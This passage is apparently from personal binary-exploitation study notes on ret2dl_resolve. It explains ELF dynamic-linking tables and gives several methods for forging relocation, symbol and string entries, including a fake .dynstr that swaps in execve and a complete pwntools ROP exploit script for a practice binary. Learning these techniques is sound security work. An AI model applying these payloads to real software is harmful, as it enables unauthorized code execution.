  |	|       ...         |        |       ...         |        |       ...         |
  |	|___________________|        |___________________|        |___________________|
  >>>>>>|      r_offset     |        |      st_name      |        |      read\0       |
	|___________________|        |___________________|        |___________________|
	|      r_info       | ____   |      st_info      |        |       ...         |
	|___________________|     |  |___________________|        |___________________|
	|       ...         |     |  |        ...        |    |>>>|      puts\0       |
	|___________________|     |  |___________________|    |   |___________________|
	|      r_offset     |     |  |      st_name      | ___|   |       ...         |
	|___________________|     |  |___________________|        |___________________|
	|      r_info       |     >>>|      st_info      |        |                   |
	|___________________|        |___________________|        |___________________|

```
		
so first we enter the call to puts.

since this is the first call to puts it is not binded we need to setup the arguments for _dl_runtime_resolve(elf_info , index )

pushes the index in this case 0x0       \
```
	0x401030                  endbr64        
 →   0x401034                  push   0x0       
     0x401039                  bnd    jmp 0x401020      
```
pushes the elf_info 0x404008:	0x00007ffff7ffe190       \
```
→   0x401020                  push   QWORD PTR [rip+0x2fe2]        # 0x404008       
     0x401026                  bnd    jmp QWORD PTR [rip+0x2fe3]        # 0x404010       
     0x40102d                  nop    DWORD PTR [rax]       
```
than we look into the rel.plt        

we pushed 0 so we look at the first entry of the Relocation table and find the r_info holding 100000007h for now we only care about the 1 which is the offset for the Symbol table       
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/Relocation_table.png">

in the Symbole table we look at offset 1 and find the st_name which holds the offset 10h
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/Symbole_table.png">
		
in the String table we look at ofset 10h and find the string puts
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/String_Table.png">


</div>
</details>




<details>
    <summary>ret2dl_resolve method 1. (PIE is off // RELRO off)</summary>
        <div>
		
# ret2dl_resolve method 1. (PIE is off // RELRO off)

Prerequisites
1. IP controll
2. ability to write to memory

in the .dynamic section there is a pointer to the String table .dynstr if RELRO is off this section is actually writeable we can change the pointer to.
if we cange d_val to a section in the .bss we can basically write our own String table there and simply could replace puts with execve.


```
 ___________________      ___________________ 
|   Symbole table   |    |    String table   | <<<______
|______.dynsym______|    |______.dynstr______|          |
|        ...        |    |        ...        |          |
|___________________|    |___________________|          |
|       st_name     |_   |       read\0      |          |
|___________________| |  |___________________|          |
|       st_info     | |>>|       puts\0      |          |
|___________________| .  |___________________|          |
        ...............                .................|_______
	.	 ___________________   .  ___________________   |
	.	|   Writeable area  |<<. |      .dynamic     |  |
	.	|________.bss_______|    |___________________|  |
	.	|        ...        |    |        ...        |  |
	.	|___________________|    |___________________|  |
	.	|       read\0      |    |  d_tag: DT_STRTAB |  |
	.	|___________________|    |___________________|  |
	.....>>>|       execve\0    |    |       d_val       |__|
		|___________________|    |___________________|

```
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/nRELROdynamicSection.png">		
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/dynstr.png">
		
fake .dynstr in .bss (d_val points to the first `\x00`)		
```
payload = b'\x00'
payload += b'libc.so.6\x00'		
payload += b'gets\x00'
payload += b'execve\x00'		#puts was here before
payload += b'__libc_start_main\x00'
payload += b'GLIBC_2.2.5\x00'
payload += b'__gmon_start__\x00'
```

</div>
</details>


<details>
    <summary>ret2dl_resolve method 2. (PIE is off// partial RELRO)</summary>
        <div>

# ret2dl_resolve method 2. (PIE is off// partial RELRO)


Prerequisites
1. IP controll
2. ability to write to memory

```
readelf -S resolve_partial_relro
		
  [ 6] .dynsym           DYNSYM           00000000004003c8
  [ 7] .dynstr           STRTAB           0000000000400470
  [11] .rela.plt         RELA             0000000000400550
  [22] .dynamic          DYNAMIC          0000000000403e20
  [24] .got.plt          PROGBITS         0000000000404000
  [26] .bss              NOBITS           0000000000404040

```

we can create a fake .rel.plt entry in the .bss and pass a huge index to _dl_runtime_resolve(elf_info,index)

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/_relplt.png">

we set 0x277 as index.   \
than runtime_resolve would look for the .rel.plt entry @ 404078 which is in .bss we have controll over and can place a fake .rel.plt struct here that contains the fake r_info.   

```
addr_fake_frame - addr_of_.rel.plt = byte_offset / 0x18 = index_offset 
0x404078 - 00400550 = 0x3B28/0x18 = 0x277   
```

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/_dynsym.png">
we set our fake r_info to 0x288 and place our fake .dynsym struct that contains the fake st_name entry directly under our fake .rel.plt struct   /
		
```
(addr_fake_struct + len(fake_.rel.plt)) - addr_of_.dynsym = byte_offset / 0x18 = fake_r_info 
(0x404078+0x10) - 004003c8     				#+0x10 cause our fake_.rel.plt is 18 bytes
0x404088 - 004003c8 = 0x3cc0/0x18 = 0x288   
```	

here we set the st_name offset to 0x3c30.    \
starting @ 0x400470 to our fake string @ 0x4040a0    
```
(addr_fake_struct + len(fake_.rel.plt) + len(fake_dynsym)) - addr_of_.dynstr = st_name 
(0x404078+0x10+0x18) - 0x400470    			#+0x10 cause our fake_.rel.plt is 18 bytes +0x18 cause fake_dynsym is 24 bytes
0x4040a0 - 0x400470 = 0x3c30    
```
and as last step we set what libc function we want to resolve into our fake .dynstr entry @ 0x4040a0




This aproach will not work allways:
If the Dynamic loader checks the boundaries.
If symbol versioning and huge pages are enabled. 
		

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/Method2.png">
		
```
#!/usr/bin/env python3
from pwn import *
import ctypes

fname = f'resolve_partial_relro'
ip = '0.0.0.0'
port = 1337

#set target binary and context
elf = context.binary = ELF(f'./{fname}')

#set libc for Pwntools
#libc = ELF('libc.so.6')



gdbscript="""
b *main
b *0x00000000004011c8
b *0x7ffff7fe7bb0
b *0x7ffff7fe00b0
b *0x7ffff7fe010b
b *0x7ffff7fe017f
"""

mode = 'attach'

if mode == 'attach':
    r = process(f'{fname}',aslr=False)

    #attach(f'{fname}',gdbscript=gdbscript)
    #set follow-fork-mode child
elif mode == 'debug':
    r = gdb.debug(f'./{fname}',aslr=False,gdbscript=gdbscript)
elif mode == 'remote':
    r = remote(ip,port)

rb = lambda x :r.recvb(x)
rl = lambda : r.recvline()
ru = lambda x :r.recvuntil(x)
s = lambda x :r.send(x)
sl = lambda x : r.sendline(x)
sla = lambda x,y : r.sendlineafter(x,y)
inter = lambda : r.interactive()

# this will import the libc rand() function that we can use it in ur python script

#libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')


def pwn():


    pop_rdi     = 0x401263
    pop_rsi_r15 = 0x401261
    pop_rdx     = 0x4011d1
    read = elf.plt['read']
    dl_resolve = 0x401020

    dynsym = 0x4003c8
    dynstr = 0x400470
    rel_plt = 0x400550



    fake_frame_addr = 0x404078
    print(f'fake frame addr = {hex(fake_frame_addr)}')
    print(f'fake r_info @ {hex(fake_frame_addr + 0xc)}')


    fake_r_info = int(((fake_frame_addr + 0x18) - dynsym) / 0x18)
    print(f'fake r_info = {hex(fake_r_info)}')
    print(f'fake st_name @ {hex(fake_r_info*0x18 + dynsym)}') #addr of fake_st_name

    #r_info is the offset from .dynsym to our fake .dynsym entry in steps of 0x18
    #0x288*0x18 = 0x3cc0    0x4003c8 + 0x3xcc0 = 0x404088


    fake_st_name = int((fake_frame_addr + 0x10 + 0x18) - dynstr)
    print(f'fake st_name = {hex(fake_st_name)}')
    print(f'fake string entry @ {hex(fake_st_name + dynstr)}')   #addr of fake_string_puts

    #st_name is the offset form .dynstr to our fake string puts
    #0x3c30 + 0x400470 = 0x4040a0




    #fake .rel.plt 0x10
    fake_frame = b''                                                                        
    fake_frame += p64(0x404018)        #0x404078 - 0x404080               #GOT addr where to resolve to                       
    fake_frame += p32(0x7)             #0x404080 - 0x404084               #needet to pass a internal check                    
    fake_frame += p32(fake_r_info)     #0x404084 - 0x404088               #fake_r_info                                             
                                                                          #r_addet we dont need these and it would destory the offsets when we add 8 bytes here
    #fake .dynsym 0x18
    fake_frame += p32(fake_st_name)    #0x404088 - 0x40408c               #st_name                                            
    fake_frame += b'\x00'              #0x40408c - 0x40408d               #st_info                           
    fake_frame += b'\x00'              #0x40408d - 0x40408e               #st_other                                           
    fake_frame += b'\x00\x00'          #0x40408e - 0x404090               #st_shndx                                           
    fake_frame += p64(0x00)            #0x404090 - 0x404098               #st_value                                           
    fake_frame += p64(0x00)            #0x404098 - 0x4040a0               #st_size

    #fake .dynstr entry
    fake_frame += b'puts\x00'          #0x4040a8 -                        #fake dynstr entry 




    len_fake_frame = len(fake_frame)

    dl_resolve_index = int((fake_frame_addr - rel_plt) / 24)
    print(f'fake Index = {hex(dl_resolve_index)}')

    payload = b''
    payload += b'A'*24              #pad
		
    #setup the read() to write our fake_frame
    payload += p64(pop_rdi)
    payload += p64(0x00)            #read from stdin
    payload += p64(pop_rsi_r15)
    payload += p64(fake_frame_addr)     #.bss addr
    payload += p64(0x00)            #junk r15
    payload += p64(pop_rdx)
    payload += p64(len_fake_frame)
    payload += p64(read)
    
    #setup registers for the resolved function in this case puts		
    payload += p64(pop_rdi)
    payload += p64(0x400000)            #argument for the function we resolve
	
    #setup arguments for the __dl_runtime_resolve() and call it.
    payload += p64(dl_resolve)
    payload += p64(dl_resolve_index)
    #for debugging
    payload += p64(0x1111111111111111)  #we hang here but we executed puts and '\x7fELF' sould be printed

    s(payload)
    pause(5)
    s(fake_frame)
    
    inter()


if __name__ == '__main__':
    pwn()		
```

</div>
</details>


	
	
<details>
    <summary>ret2dl_resolve method 3. (PIE is off//partial RELRO)</summary>
        <div>
in prgoress		
# ret2dl_resolve method 3. (PIE is off//partial RELRO)

Prerequisites
1. IP controll
2. ability to write to an addr `*(destination) = value` 

`mov [rax],rdi`


3. ability to write to a pointer with an offset  `*(*(reg) + offset) = value`

```
mov rax, [rax]				#get the pointed addr into rax
mov [rax + rdx], rdi		#add rdx to pointed addr and mov rdi into it
```

elf_info points to a link_map struct    \
the link_map holds a pointer to the .dynstr table    \
the elf_info is allways available at a reserved GOT entry GOT[1]

this is like the first attack but we need a specific gadget to exploit this sucesfully.

we know the pointer to the link_map but we actually have to rewrite an entry in the link map.    \


```
gef➤  got

GOT protection: Partial RelRO | GOT functions: 5
 
[0x601018] puts@GLIBC_2.2.5  →  0x400566
[0x601020] setbuf@GLIBC_2.2.5  →  0x7ffff7e4ac50
[0x601028] read@GLIBC_2.2.5  →  0x400586
[0x601030] __libc_start_main@GLIBC_2.2.5  →  0x7ffff7de2fc0
[0x601038] strcmp@GLIBC_2.2.5  →  0x4005a6

```

```
gef➤  tel 0x601000
0x0000000000601000│+0x0000: 0x0000000000600e28  →  0x0000000000000001
0x0000000000601008│+0x0008: 0x00007ffff7ffe190  →  0x0000000000000000
0x0000000000601010│+0x0010: 0x00007ffff7fe7bb0  →   endbr64 
0x0000000000601018│+0x0018: 0x0000000000400566  →  0xffe0e90000000068 ("h"?)
0x0000000000601020│+0x0020: 0x00007ffff7e4ac50  →  <setbuf+0> endbr64 
0x0000000000601028│+0x0028: 0x0000000000400586  →  <read@plt+6> push 0x2
0x0000000000601030│+0x0030: 0x00007ffff7de2fc0  →  <__libc_start_main+0> endbr64 
0x0000000000601038│+0x0038: 0x00000000004005a6  →  <strcmp@plt+6> push 0x4
0x0000000000601040│+0x0040: 0x0000000000000000
0x0000000000601048│+0x0048: 0x0000000000000000

```
```
gef➤  tel 0x00007ffff7ffe190
0x00007ffff7ffe190│+0x0000: 0x0000000000000000
0x00007ffff7ffe198│+0x0008: 0x00007ffff7ffe730  →  0x0000000000000000
0x00007ffff7ffe1a0│+0x0010: 0x0000000000600e28  →  0x0000000000000001					#pointer to .dynamic
0x00007ffff7ffe1a8│+0x0018: 0x00007ffff7ffe740  →  0x00007ffff7fcd000  →  0x00010102464c457f
0x00007ffff7ffe1b0│+0x0020: 0x0000000000000000
0x00007ffff7ffe1b8│+0x0028: 0x00007ffff7ffe190  →  0x0000000000000000
0x00007ffff7ffe1c0│+0x0030: 0x0000000000000000
0x00007ffff7ffe1c8│+0x0038: 0x00007ffff7ffe718  →  0x00007ffff7ffe730  →  0x0000000000000000
0x00007ffff7ffe1d0│+0x0040: 0x0000000000000000
0x00007ffff7ffe1d8│+0x0048: 0x0000000000600e28  →  0x0000000000000001

```
		
.dynamic struct look like this
```
gef➤  tel 20 0x0000000000600e28
0x0000000000600e28│+0x0000: 0x0000000000000001
0x0000000000600e30│+0x0008: 0x0000000000000001
0x0000000000600e38│+0x0010: 0x000000000000000c
0x0000000000600e40│+0x0018: 0x0000000000400528  →  <_init+0> sub rsp, 0x8
0x0000000000600e48│+0x0020: 0x000000000000000d
0x0000000000600e50│+0x0028: 0x00000000004007d4  →  <_fini+0> sub rsp, 0x8
0x0000000000600e58│+0x0030: 0x0000000000000019
0x0000000000600e60│+0x0038: 0x0000000000600e10  →  0x0000000000400690  →  <frame_dummy+0> mov edi, 0x600e20
0x0000000000600e68│+0x0040: 0x000000000000001b
0x0000000000600e70│+0x0048: 0x0000000000000008
0x0000000000600e78│+0x0050: 0x000000000000001a
0x0000000000600e80│+0x0058: 0x0000000000600e18  →  0x0000000000400670  →  <__do_global_dtors_aux+0> 
0x0000000000600e88│+0x0060: 0x000000000000001c
0x0000000000600e90│+0x0068: 0x0000000000000008
0x0000000000600e98│+0x0070: 0x000000006ffffef5
0x0000000000600ea0│+0x0078: 0x0000000000400298  →   add eax, DWORD PTR [rax]
0x0000000000600ea8│+0x0080: 0x0000000000000005
0x0000000000600eb0│+0x0088: 0x00000000004003b8  →   add BYTE PTR [rcx+rbp*2+0x62], ch				#pointer to .dynstr
0x0000000000600eb8│+0x0090: 0x0000000000000006
0x0000000000600ec0│+0x0098: 0x00000000004002c8  →   add BYTE PTR [rax], al

```
		
we overwrite the l_info[DT_STRTAB] in the struct starting @ 0x00007ffff7ffe190 at offset +0x0010 and change it to an bss addr.
and at the .bss addr we create a fake .dynamic struct

at .bss +0x0088 we store our pointer to the fake .dynstr struct we create 



``` 
         ___________________       ___________________       ___________________
	|        GOT        |  |>>|      .dynamic     |  |->|      .dynstr      |
	|______.plt.got_____|  |  |___________________|  |  |___________________|
	|        got[0]     |  |  |        ...        |  |  |       read\0      |  
	|___________________|  |  |___________________|  |  |___________________|  
	|        got[1]     |  |  |  d_tag: DT_STRTAB |  |  |       puts\0      | 
 |------|___________________|  |  |___________________|  |  |___________________|
 |	|        got[2]     |  |  |       d_val       |--| 
 |	|___________________|  |  |___________________|
 |                             |
 |	 ___________________   |   ___________________  
 |	|                   |  |.>|   Writable area   |  
 |	|___________________|  |. |________.bss_______|  
 |	|        ...        |  |. | d_tag: DT_STRTAB  |  
 |	|___________________|  |. |___________________|  
 |	|  l_info[DT_HASH]  |  |. |        d_val      |--|  
 |	|___________________|  |. |___________________|  |
 |---->>| l_info[DT_STRTAB] |--|. |         ...       |  |
	|___________________|     |___________________| <
	| l_info[DT_SYMTAB] |     |      read\0       |
	|___________________|     |___________________|
				  |      execve\0     |
				  |___________________|
```
</div>
</details>


		
	
<details>
    <summary>ret2dl_resolve method 4. (PIE is off//full RELRO)</summary>
        <div>
		
# ret2dl_resolve method 4. (PIE is off//full RELRO)
		
in this methode we use a debugging feature DT_DEBUG in the .dynamic section that points to a debugger data struct. (it is used by e.g. gdb to track loading of new librarys)

this DT_DEBUG data struct also holds a pointer to the link_map

but we still have to find the dl_runtime_resolve() cause the reserved GOT entry for it is gone as well as the elf_info link_map reserver GOT

the link_map is part of a linked list.
If we go to the next entry in the liniked list 


Prerequisites
1. IP controll
2. ability to write to an addr `*(destination) = value` 

`mov [rax],rdi`


3. ability to write to a pointer with an offset  `*(*(rax) + offset) = value`


```
mov rax, [rax]
mov [rax + offset],value
```

4. 

```
mov pointer, [pointer]
mov reg, [pointer + offset]
mov [destination], reg
```
5.
```
mov reg, [source]
mov [esp + offset], reg
```

```
     ___________________                     ___________________         ___________________ 
    |   Dynamic section |                   |       [HEAP]      |       |        GOT        |  
    |______.dynamic_____|                   |___________________|     |>|______.plt.got_____|    
    |        ...        |                   |         ...       |     | |       GOT[0]      |   
    |___________________|                   |___________________|     | |___________________|   
    |  d_tag: DT_DEBUG  |                   |      r_version    |     | |       GOT[1]      |      
    |___________________|                   |___________________|     | |___________________|      
    |       d_val       | ---------------->>|        r_map      |     | |       GOT[2]      |---_dl_runtime_resolve
    |___________________|                   |___________________|--|  | |___________________|    
    |        ...        |                   |         ...       |  |  | |       GOT[3]      | 
    |___________________|                   |___________________|  |  | |___________________|   
    |  d_tag: DT_STRTAB |           |-------|l_info [DT_STRTAB] |  |  | |        ...        |  
    |___________________|           | ......|___________________|  |  | |___________________|  
 ---|       d_val       |           | .     |         ...       |  |  |    
 |  |___________________|           | .     |___________________|  |  |   
 |                                  | .   --|       l_next      |<-|  |
 |                                  | .   | |___________________|     |
 |                                  | .   | |         ...       |     |
 |                                  | .   | |___________________|     |
 |                                  | .   |>| l_info[DT_PLTGOT] |-----|
 |                                  | .     |___________________|
 |   ___________________            | .
 ->>|    String table   |<<---------- .
    |______.dynstr______|              .
    |        ...        |               ................
    |___________________|        ___________________   .
    |       read\0      |       |    Writable area  |  .
    |___________________|       |________.bss_______|<<.
    |       puts\0      |<--    |        ...        |
    |___________________|  |    |___________________|
    |        ...        |  |    |       read\0      |
    |___________________|  |    |___________________|
                           |..>>|       execve\0    |
     ___________________   |.   |___________________| 
    |   Symbol table    |  |.  
    |______.dynsym______|  |.    
    |        ...        |  |.   
    |___________________|  |.   
    |      st_name      |--|.    
    |___________________| 
    |      st_info      |    
    |___________________|   
    |        ...        |    
    |___________________| 
```
IN PROGESS
		
		
		
</div>
</details>

# SROP
in progress
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/sigret_frame.png">
